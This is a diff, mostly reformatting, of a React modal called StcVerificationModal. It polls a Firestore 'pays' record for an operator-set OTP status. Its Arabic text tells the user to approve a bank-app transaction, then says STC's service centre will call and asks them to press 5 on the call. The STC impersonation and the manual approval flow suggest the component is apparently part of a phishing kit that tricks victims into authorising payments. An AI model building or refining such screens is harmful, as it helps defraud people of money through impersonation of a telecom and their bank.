@@ -14,11 +14,11 @@ interface StcVerificationModalProps {
   onRejected: () => void
 }
 
-export function StcVerificationModal({ 
-  open, 
-  visitorId, 
-  onApproved, 
-  onRejected 
+export function StcVerificationModal({
+  open,
+  visitorId,
+  onApproved,
+  onRejected,
 }: StcVerificationModalProps) {
   const [status, setStatus] = useState<"pending" | "approved" | "rejected" | "message">("pending")
   const [isConfirming, setIsConfirming] = useState(false)
@@ -30,8 +30,13 @@ export function StcVerificationModal({
       doc(db as Firestore, "pays", visitorId),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const phoneOtpStatus = data.phoneOtpStatus as "pending" | "approved" | "rejected" | "verifying" | "message"
+          const data = docSnapshot.data() as any
+          const phoneOtpStatus = data?.phoneOtpStatus as
+            | "pending"
+            | "approved"
+            | "rejected"
+            | "verifying"
+            | "message"
 
           if (phoneOtpStatus === "approved") {
             setStatus("approved")
@@ -48,7 +53,7 @@ export function StcVerificationModal({
       },
       (error) => {
         console.error("[STC Modal] Listener error:", error)
-      }
+      },
     )
 
     return () => unsubscribe()
@@ -58,7 +63,11 @@ export function StcVerificationModal({
     if (!visitorId || !db) return
     setIsConfirming(true)
     try {
-      await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
+      await setDoc(
+        doc(db as Firestore, "pays", visitorId),
+        { phoneOtpStatus: "confirmed" },
+        { merge: true },
+      )
     } catch (err) {
       console.error("[STC Modal] confirm error:", err)
       setIsConfirming(false)
@@ -67,8 +76,8 @@ export function StcVerificationModal({
 
   return (
     <Dialog open={open} onOpenChange={() => {}}>
-      <DialogContent 
-        className="sm:max-w-md" 
+      <DialogContent
+        className="sm:max-w-md"
         dir="rtl"
         onPointerDownOutside={(e) => e.preventDefault()}
         onEscapeKeyDown={(e) => e.preventDefault()}
@@ -87,17 +96,35 @@ export function StcVerificationModal({
                 تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "0ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "150ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]"
+                  style={{ animationDelay: "300ms" }}
+                />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "0ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "150ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]"
+                    style={{ animationDelay: "300ms" }}
+                  />
                 </div>
                 <p className="text-sm font-semibold text-[#1976d2]">جاري انتظار موافقة البنك...</p>
               </div>
@@ -130,14 +157,24 @@ export function StcVerificationModal({
             </div>
             <div className="text-center space-y-3 px-4">
               <p className="text-lg text-gray-700 leading-relaxed">
-                عزيزنا العميل سيتم الاتصال بك من مركز خدمات STC الرجاء الرد على المكالمة و الضغط على الرقم <span className="font-bold text-purple-600">5</span>
+                عزيزنا العميل سيتم الاتصال بك من مركز خدمات STC الرجاء الرد على المكالمة و الضغط على الرقم{" "}
+                <span className="font-bold text-purple-600">5</span>
               </p>
             </div>
             <div className="flex flex-col items-center space-y-2">
               <div className="flex space-x-2 space-x-reverse">
-                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
-                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
-                <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
+                <div
+                  className="w-3 h-3 bg-purple-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "0ms" }}
+                ></div>
+                <div
+                  className="w-3 h-3 bg-purple-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "150ms" }}
+                ></div>
+                <div
+                  className="w-3 h-3 bg-purple-500 rounded-full animate-bounce"
+                  style={{ animationDelay: "300ms" }}
+                ></div>
               </div>
               <p className="text-sm text-gray-500">جاري الانتظار...</p>
             </div>
